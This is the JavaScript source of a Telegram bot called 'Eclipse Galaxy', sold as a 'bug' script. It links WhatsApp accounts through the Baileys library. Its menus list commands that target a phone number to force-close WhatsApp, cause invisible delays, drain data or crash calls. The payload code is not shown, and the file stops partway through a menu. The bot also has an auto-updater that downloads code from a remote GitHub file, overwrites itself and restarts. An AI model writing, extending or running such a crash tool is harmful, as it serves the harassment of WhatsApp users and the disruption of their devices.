const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require("@whiskeysockets/baileys");
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const axios = require("axios");
const chalk = require("chalk"); 
const config = require("./control/config.js");
const TelegramBot = require("node-telegram-bot-api");
const moment = require("moment");
const FormData = require("form-data");
const { exec, spawn } = require("child_process");
const util = require("util");
const execPromise = util.promisify(exec);

let premiumUsers = JSON.parse(fs.readFileSync("./dtbs/premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./dtbs/admin.json"));

// ========== VARIABEL UNTUK AUTO UPDATE ==========
let autoUpdateEnabled = false;
let updateInterval = null;
const UPDATE_CHECK_INTERVAL = 60 * 60 * 1000; // 1 jam
const GITHUB_RAW_URL = "https://raw.githubusercontent.com/Serenhopee/eclipse-galaxy/main/index.js"; // GANTI DENGAN URL RAW GITHUB LO!
const CURRENT_VERSION = "3.0";
let updateInProgress = false;
let updateChannelId = null; // Untuk notifikasi update

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./dtbs/premium.json");
ensureFileExists("./dtbs/admin.json");

// Fungsi untuk menyimpan data premium dan admin
function savePremiumUsers() {
  fs.writeFileSync(
    "./dtbs/premium.json",
    JSON.stringify(premiumUsers, null, 2)
  );
}

function saveAdminUsers() {
  fs.writeFileSync(
    "./dtbs/admin.json",
    JSON.stringify(adminUsers, null, 2)
  );
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`Error updating ${filePath}:`, error.message);
      }
    }
  });
}

watchFile("./dtbs/premium.json", (data) => (premiumUsers = data));
watchFile("./dtbs/admin.json", (data) => (adminUsers = data));

function isPrem(userId) {
  const data = JSON.parse(
    fs.readFileSync("./dtbs/premium.json", "utf-8")
  );
  return data.includes(Number(userId));
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `yes - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "not premium";
  }
}

const BOT_TOKEN = config.BOT_TOKEN;
const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/GibranSatrio/Eclipsess/refs/heads/main/mbut.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("[ ! ]: Token tidak valid! Bot tidak dapat dijalankan."));
    process.exit(1);
  }

  console.log(chalk.green(`[ ! ]: Token Kamu dikenali oleh sistem. Enjoy your Script`));
  startBot();
  initializeWhatsAppConnections();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.clear();
  console.log(
    chalk.yellow(`
⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

`)
  );

  console.log(
    chalk.bold.red(`
Dev : @Serenhopee
Version: ${CURRENT_VERSION}
Thanks for buying this Script..
`));
}

validateToken();

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(chalk.bold.yellow(`Mencoba menghubungkan WhatsApp: ${botNumber}`));
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(chalk.bold.green(`Bot ${botNumber} terhubung!`));
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(chalk.bold.blue(`Mencoba menghubungkan ulang bot ${botNumber}...`));
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `<blockquote>┏━━━⪻ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐧𝐠 ⪼━━━┓
 Nomor : ${botNumber} 
 Statistic : Instalasii... 
┗━━━━━━━━━━━━━━━━━━━━━┛</blockquote>`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: true,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `<blockquote>┏━━━⪻ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐧𝐠 ⪼━━━┓
 Nᴜᴍʙᴇʀ : ${botNumber} 
 Lᴏᴀᴅ : Try Connected.
┗━━━━━━━━━━━━━━━━━━━━━┛</blockquote>`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `<blockquote>┏━━━⪻ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐧𝐠 ⪼━━━┓
 Nᴜᴍʙᴇʀ : ${botNumber} 
 Lᴏᴀᴅ : 🔴 Gagal Terhubung...
┗━━━━━━━━━━━━━━━━━━━━━┛</blockquote>`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `<blockquote>┏━━━⪻ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐧𝐠 ⪼━━━┓
 Nᴜᴍʙᴇʀ : ${botNumber} 
 Lᴏᴀᴅ : 🟢 <b>Connected</b>
┗━━━━━━━━━━━━━━━━━━━━━┛</blockquote>`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "ECLIPSEV26");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `<blockquote>┏━━━⪻ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐧𝐠 ⪼━━━┓
 Nᴜᴍʙᴇʀ : ${botNumber} 
 Yᴏᴜʀ Cᴏᴅᴇ : <code>${formattedCode}</code>
 ┗━━━━━━━━━━━━━━━━━━━━━┛</blockquote>`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "HTML",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `<blockquote>┏━━━⪻ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐧𝐠 ⪼━━━┓
 Nᴜᴍʙᴇʀ : ${botNumber} 
 Mᴇssᴀɢᴇ : ${error.message}
┗━━━━━━━━━━━━━━━━━━━━━┛</blockquote>`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

//-# Fungsional Function Before Parameters

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options);
}

// Get Random Image - BANYAKIN PILIHAN FOTO
function getRandomImage() {
  const images = [
    "https://files.catbox.moe/8mcyk6.jpg",
    "https://files.catbox.moe/8mcyk6.jpg",
    "https://files.catbox.moe/8mcyk6.jpg",
    "https://files.catbox.moe/8mcyk6.jpg",
    "https://files.catbox.moe/8mcyk6.jpg",
    "https://files.catbox.moe/8mcyk6.jpg",
    "https://files.catbox.moe/8mcyk6.jpg",
    "https://files.catbox.moe/8mcyk6.jpg"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// IMAGE UNTUK SETIAP MENU SPESIFIK
const menuImages = {
  main: "https://files.catbox.moe/8mcyk6.jpg",
  bug: "https://files.catbox.moe/8mcyk6.jpg",
  invis: "https://files.catbox.moe/8mcyk6.jpg",
  ios: "https://files.catbox.moe/8mcyk6.jpg",
  tools: "https://files.catbox.moe/8mcyk6.jpg",
  owner: "https://files.catbox.moe/8mcyk6.jpg",
  custom: "https://files.catbox.moe/8mcyk6.jpg",
  tqto: "https://files.catbox.moe/8mcyk6.jpg",
  multi: "https://files.catbox.moe/8mcyk6.jpg",
  update: "https://files.catbox.moe/8mcyk6.jpg"
};

// ~ Coldown
let cooldownDuration = 0;
const userCooldown = new Map();

function parseDuration(input) {
  const match = input.match(/^(\d+)(s|m|h)$/);
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2];

  switch (unit) {
    case "s":
      return value * 1000;
    case "m":
      return value * 60 * 1000;
    case "h":
      return value * 60 * 60 * 1000;
    default:
      return null;
  }
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// ========== FUNGSI AUTO UPDATE ==========

// Fungsi untuk mengecek versi terbaru dari GitHub
async function checkLatestVersion() {
  try {
    const response = await axios.get(GITHUB_RAW_URL, {
      timeout: 10000,
      headers: {
        'User-Agent': 'Eclipse-Galaxy-Bot'
      }
    });
    
    // Cari versi di file (asumsi ada CURRENT_VERSION di file)
    const versionMatch = response.data.match(/CURRENT_VERSION\s*=\s*["']([^"']+)["']/);
    if (versionMatch && versionMatch[1]) {
      return {
        version: versionMatch[1],
        content: response.data
      };
    }
    return null;
  } catch (error) {
    console.error("Error checking latest version:", error.message);
    return null;
  }
}

// Fungsi untuk melakukan update
async function performUpdate(chatId, notifyChannel = true) {
  if (updateInProgress) {
    if (chatId) {
      await bot.sendPhoto(chatId, menuImages.update, {
        caption: "⚠️ *Update sedang berjalan!* Tunggu sampai selesai.",
        parse_mode: "Markdown"
      });
    }
    return false;
  }

  updateInProgress = true;
  
  try {
    if (chatId) {
      await bot.sendPhoto(chatId, menuImages.update, {
        caption: "🔄 *Memeriksa update terbaru...*",
        parse_mode: "Markdown"
      });
    }

    const latest = await checkLatestVersion();
    
    if (!latest) {
      if (chatId) {
        await bot.sendPhoto(chatId, menuImages.update, {
          caption: "❌ *Gagal memeriksa update!* Coba lagi nanti.",
          parse_mode: "Markdown"
        });
      }
      updateInProgress = false;
      return false;
    }

    if (latest.version === CURRENT_VERSION) {
      if (chatId) {
        await bot.sendPhoto(chatId, menuImages.update, {
          caption: `✅ *Bot sudah versi terbaru!*\n\nVersi saat ini: ${CURRENT_VERSION}`,
          parse_mode: "Markdown"
        });
      }
      updateInProgress = false;
      return false;
    }

    // Ada update tersedia
    const updateMsg = await bot.sendPhoto(chatId || updateChannelId, menuImages.update, {
      caption: `🔄 *UPDATE TERSEDIA!*\n\n` +
               `Versi saat ini: ${CURRENT_VERSION}\n` +
               `Versi terbaru: ${latest.version}\n\n` +
               `⏳ Proses update dimulai...`,
      parse_mode: "Markdown"
    });

    // Backup file lama
    const backupPath = `index.js.backup-${Date.now()}`;
    fs.copyFileSync("index.js", backupPath);
    
    // Update file
    fs.writeFileSync("index.js", latest.content);
    
    await bot.editMessageCaption(
      `✅ *UPDATE BERHASIL!*\n\n` +
      `Versi ${CURRENT_VERSION} ➜ ${latest.version}\n` +
      `Backup dibuat: ${path.basename(backupPath)}\n\n` +
      `🔄 *Restarting bot...*`,
      {
        chat_id: chatId || updateChannelId,
        message_id: updateMsg.message_id,
        parse_mode: "Markdown"
      }
    );

    // Simpan status auto update untuk di-restore setelah restart
    if (autoUpdateEnabled && updateChannelId) {
      fs.writeFileSync("./autoupdate_config.json", JSON.stringify({
        enabled: true,
        channelId: updateChannelId
      }));
    }

    // Restart bot
    setTimeout(() => {
      console.log("Restarting bot after update...");
      process.exit(0);
    }, 3000);

    return true;
  } catch (error) {
    console.error("Update error:", error);
    if (chatId) {
      await bot.sendPhoto(chatId, menuImages.update, {
        caption: `❌ *Update gagal!*\n\nError: ${error.message}`,
        parse_mode: "Markdown"
      });
    }
    updateInProgress = false;
    return false;
  }
}

// Fungsi untuk memulai auto update interval
function startAutoUpdate(chatId) {
  if (updateInterval) {
    clearInterval(updateInterval);
  }
  
  autoUpdateEnabled = true;
  updateChannelId = chatId;
  
  updateInterval = setInterval(async () => {
    console.log("Auto update check...");
    const latest = await checkLatestVersion();
    
    if (latest && latest.version !== CURRENT_VERSION) {
      // Ada update, langsung update
      await performUpdate(updateChannelId, true);
    }
  }, UPDATE_CHECK_INTERVAL);
  
  // Simpan konfigurasi
  fs.writeFileSync("./autoupdate_config.json", JSON.stringify({
    enabled: true,
    channelId: chatId
  }));
}

// Fungsi untuk menghentikan auto update
function stopAutoUpdate() {
  if (updateInterval) {
    clearInterval(updateInterval);
    updateInterval = null;
  }
  
  autoUpdateEnabled = false;
  updateChannelId = null;
  
  // Hapus konfigurasi
  if (fs.existsSync("./autoupdate_config.json")) {
    fs.unlinkSync("./autoupdate_config.json");
  }
}

// Load konfigurasi auto update saat bot start
function loadAutoUpdateConfig() {
  try {
    if (fs.existsSync("./autoupdate_config.json")) {
      const config = JSON.parse(fs.readFileSync("./autoupdate_config.json"));
      if (config.enabled && config.channelId) {
        startAutoUpdate(config.channelId);
        console.log(chalk.green("✅ Auto update loaded from config"));
      }
    }
  } catch (error) {
    console.error("Error loading auto update config:", error);
  }
}

// ========== KELAP-KELIP BUTTON ==========
let kelapKelip = true;
setInterval(() => {
  kelapKelip = !kelapKelip;
}, 500);

// ========== FUNGSI BUAT BUTTON DENGAN WARNA ==========
function buatButtonWarna(text, callback_data, style = "primary") {
  let teks = text;
  
  // Tambah efek kelap-kelip untuk button tertentu
  if (text.includes("START") || text.includes("MULAI")) {
    teks = kelapKelip ? `✨ ${text} ✨` : `⚡ ${text} ⚡`;
  }
  
  return { text: teks, callback_data, style };
}

function buatButtonUrlWarna(text, url, style = "primary") {
  return { text, url, style };
}

// ========== VARIABEL UNTUK MULTI-PILIH BUG ==========
let multiBugSelections = {}; // Nyimpen pilihan bug tiap user
const availableBugs = [
  { id: "xcursed", name: "XCURSED", emoji: "💀", style: "danger" },
  { id: "xevil", name: "XEVIL", emoji: "👿", style: "danger" },
  { id: "xui", name: "XUI", emoji: "🖥️", style: "primary" },
  { id: "xdelay", name: "XDELAY", emoji: "⏱️", style: "primary" },
  { id: "xinvis", name: "XINVIS", emoji: "👻", style: "success" },
  { id: "xvisible", name: "XVISIBLE", emoji: "👁️", style: "success" },
  { id: "xcall", name: "XCALL", emoji: "📞", style: "danger" },
  { id: "xspam", name: "XSPAM", emoji: "💬", style: "primary" }
];

// ========== PERINTAH UPDATE ==========

// Command untuk update manual
bot.onText(/^\/update$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!isOwner(userId) && !adminUsers.includes(userId)) {
    return bot.sendPhoto(chatId, menuImages.update, {
      caption: "⚠️ *Akses Ditolak!*\nHanya owner dan admin yang bisa menggunakan command ini.",
      parse_mode: "Markdown"
    });
  }
  
  await performUpdate(chatId, false);
});

// Command untuk mengaktifkan auto update
bot.onText(/^\/autoupdate$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!isOwner(userId) && !adminUsers.includes(userId)) {
    return bot.sendPhoto(chatId, menuImages.update, {
      caption: "⚠️ *Akses Ditolak!*\nHanya owner dan admin yang bisa menggunakan command ini.",
      parse_mode: "Markdown"
    });
  }
  
  if (autoUpdateEnabled) {
    return bot.sendPhoto(chatId, menuImages.update, {
      caption: "✅ *Auto update sudah aktif!*\n\nGunakan /offautoupdate untuk menonaktifkan.",
      parse_mode: "Markdown"
    });
  }
  
  startAutoUpdate(chatId);
  
  await bot.sendPhoto(chatId, menuImages.update, {
    caption: `✅ *Auto update diaktifkan!*\n\n` +
             `Bot akan otomatis memeriksa update setiap 1 jam.\n` +
             `Channel notifikasi: this chat\n\n` +
             `Gunakan /offautoupdate untuk menonaktifkan.`,
    parse_mode: "Markdown"
  });
});

// Command untuk menonaktifkan auto update
bot.onText(/^\/offautoupdate$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!isOwner(userId) && !adminUsers.includes(userId)) {
    return bot.sendPhoto(chatId, menuImages.update, {
      caption: "⚠️ *Akses Ditolak!*\nHanya owner dan admin yang bisa menggunakan command ini.",
      parse_mode: "Markdown"
    });
  }
  
  if (!autoUpdateEnabled) {
    return bot.sendPhoto(chatId, menuImages.update, {
      caption: "❌ *Auto update sudah tidak aktif!*",
      parse_mode: "Markdown"
    });
  }
  
  stopAutoUpdate();
  
  await bot.sendPhoto(chatId, menuImages.update, {
    caption: "✅ *Auto update dimatikan!*",
    parse_mode: "Markdown"
  });
});

// Command untuk cek versi
bot.onText(/^\/version$/, async (msg) => {
  const chatId = msg.chat.id;
  
  const latest = await checkLatestVersion();
  const updateStatus = autoUpdateEnabled ? "✅ Aktif" : "❌ Tidak aktif";
  
  let caption = `*📱 ECLIPSE GALAXY VERSION*\n\n` +
                `Versi saat ini: \`${CURRENT_VERSION}\`\n` +
                `Auto update: ${updateStatus}\n\n`;
  
  if (latest) {
    caption += `Versi terbaru: \`${latest.version}\`\n`;
    if (latest.version !== CURRENT_VERSION) {
      caption += `⚠️ *Update tersedia!* Gunakan /update\n`;
    } else {
      caption += `✅ *Sudah versi terbaru!*\n`;
    }
  } else {
    caption += `❌ Gagal mengecek versi terbaru\n`;
  }
  
  await bot.sendPhoto(chatId, menuImages.update, {
    caption: caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          buatButtonWarna("🔄 Update Now", "force_update", "danger"),
          buatButtonWarna(autoUpdateEnabled ? "🔴 Matikan Auto" : "🟢 Aktifkan Auto", "toggle_auto_update", "primary")
        ]
      ]
    }
  });
});

// ========== PERINTAH START ==========
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const userId = msg.from.id;
  const usn = msg.from.username;
  const statusPrem = getPremiumStatus(userId);
  const randomImage = getRandomImage();
  
  const startKeyboard = {
    inline_keyboard: [
      [
        buatButtonWarna("(🧬) Eclipse Menu", "bugmenu", "primary"),
        buatButtonWarna("(⚙️) Controll Menu", "ownermenu", "success")
      ],
      [
        buatButtonWarna("(👁) Thanks To", "tqto", "danger")
      ],
      [
        buatButtonUrlWarna("(❕) Channel Information", "https://t.me/SerenEclipse", "primary")
      ]
    ]
  };
  
  bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`JavaScript
ⓘ hello 👋🏻 ${usn}, my name is Eclipse Galaxy! i was created by @Serenhopee to be your bug assistant! don't abuse it.

(🪐) ＥＣＬＩＰＳＥ ＧＡＬＡＸＹ
───────────────────────
⚘. Creator: @Serenhopee
⚘. Version: ${CURRENT_VERSION}
⚘. Runtime: ${runtime}
    
press the button to show other menu .ᐟ
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: startKeyboard
  });
});

// ========== CALLBACK QUERY HANDLER ==========
bot.on("callback_query", async (callbackQuery) => {
  try {
    const data = callbackQuery.data;
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const userId = callbackQuery.from.id;
    const runtime = getBotRuntime();
    const usn = callbackQuery.from.username;

    let newCaption;
    let newButtons;
    let imageToUse;

    // Handle force update
    if (data === "force_update") {
      if (!isOwner(userId) && !adminUsers.includes(userId)) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "❌ Akses ditolak!",
          show_alert: true
        });
        return;
      }
      
      await bot.deleteMessage(chatId, messageId);
      await performUpdate(chatId, false);
      await bot.answerCallbackQuery(callbackQuery.id);
      return;
    }
    
    // Handle toggle auto update
    if (data === "toggle_auto_update") {
      if (!isOwner(userId) && !adminUsers.includes(userId)) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "❌ Akses ditolak!",
          show_alert: true
        });
        return;
      }
      
      await bot.deleteMessage(chatId, messageId);
      
      if (autoUpdateEnabled) {
        stopAutoUpdate();
        await bot.sendPhoto(chatId, menuImages.update, {
          caption: "✅ *Auto update dimatikan!*",
          parse_mode: "Markdown"
        });
      } else {
        startAutoUpdate(chatId);
        await bot.sendPhoto(chatId, menuImages.update, {
          caption: "✅ *Auto update diaktifkan!*",
          parse_mode: "Markdown"
        });
      }
      
      await bot.answerCallbackQuery(callbackQuery.id);
      return;
    }

    // ========== MENU UTAMA ==========
    if (data === "bugmenu") {
      await bot.deleteMessage(chatId, messageId);
      imageToUse = menuImages.bug;
      newCaption = `\`\`\`JavaScript
ⓘ hello 👋🏻 ${usn}, my name is Eclipse Galaxy! i was created by @Serenhopee to be your bug assistant! don't abuse it.

(🪐) ＥＣＬＩＰＳＥ ＧＡＬＡＸＹ
───────────────────────
⚘. Creator: @Serenhopee
⚘. Version: ${CURRENT_VERSION}
⚘. Runtime: ${runtime}

(🧬) ＥＣＬＩＰＳＥ ＭＥＮＵ
───────────────────────
ϟ° /vulcano 628XXX - fc no invis
ϟ° /eclipse 628XXX - fc no visible x ui
ϟ° /apocalypse 628XXX - fc no click call
ϟ° /xcursed 628XXX - fc no click 1 msg meta
\`\`\``;

      newButtons = [
        [
          buatButtonWarna("(️💀) Invisible Menu", "invisbug", "danger"),
          buatButtonWarna("(🍎) IOS Menu", "iosbug", "primary")
        ],
        [
          buatButtonWarna("(🛠) Tools Menu", "toolsmenu", "success"),
          buatButtonWarna("(🎨) Custom Bug", "custombugmenu", "primary")
        ],
        [
          buatButtonWarna("(⬅️) Back", "mainmenu", "danger")
        ]
      ];
    }
    
    else if (data === "invisbug") {
      await bot.deleteMessage(chatId, messageId);
      imageToUse = menuImages.invis;
      newCaption = `\`\`\`JavaScript
ⓘ hello 👋🏻 ${usn}, my name is Eclipse Galaxy! i was created by @Serenhopee to be your bug assistant! don't abuse it.

(🪐) ＥＣＬＩＰＳＥ ＧＡＬＡＸＹ
───────────────────────
⚘. Creator: @Serenhopee
⚘. Version: ${CURRENT_VERSION}
⚘. Runtime: ${runtime}

(🧬) ＥＣＬＩＰＳＥ ＭＥＮＵ
───────────────────────
ϟ° /xenon 628XXX - Invisible Delay Easy
ϟ° /sucksdata 628XXX - Invisible Delay x Drain Data
ϟ° /metamefifin 628XXX - Invisible Delay Hard
ϟ° /voltra 628XXX - Invisible Delay Hard Bebas Spam [HOT]
\`\`\``;

      newButtons = [
        [
          buatButtonWarna("(⬅️) Back", "bugmenu", "danger"),
          buatButtonWarna("(🍎) IOS Menu", "iosbug", "primary")
        ],
        [
          buatButtonWarna("(🛠) Tools Menu", "toolsmenu", "success")
        ]
      ];
    }
    
    else if (data === "iosbug") {
      await bot.deleteMessage(chatId, messageId);
      imageToUse = menuImages.ios;
      newCaption = `\`\`\`JavaScript
ⓘ hello 👋🏻 ${usn}, my name is Eclipse Galaxy! i was created by @Serenhopee to be your bug assistant! don't abuse it.

(🪐) ＥＣＬＩＰＳＥ ＧＡＬＡＸＹ
───────────────────────
⚘. Creator: @Serenhopee
⚘. Version: ${CURRENT_VERSION}
⚘. Runtime: ${runtime}

(🧬) ＥＣＬＩＰＳＥ ＭＥＮＵ
───────────────────────
